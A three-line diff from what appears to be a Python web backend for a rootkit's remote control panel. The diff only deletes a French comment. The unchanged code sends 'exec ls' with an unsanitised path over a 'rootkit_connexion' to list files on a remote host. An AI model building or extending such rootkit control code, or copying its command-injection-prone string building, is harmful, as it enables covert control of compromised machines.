@@ -211,7 +211,6 @@ def api_list_remote_files():
         path = "/"
 
     try:
-        # ✅ ici : inclure le path dans la commande exec ls
         result = cfg.rootkit_connexion.send(f"exec ls -pA1 {path}", use_history=False, channel="tcp")
 
         if not result or "stdout:" not in result:
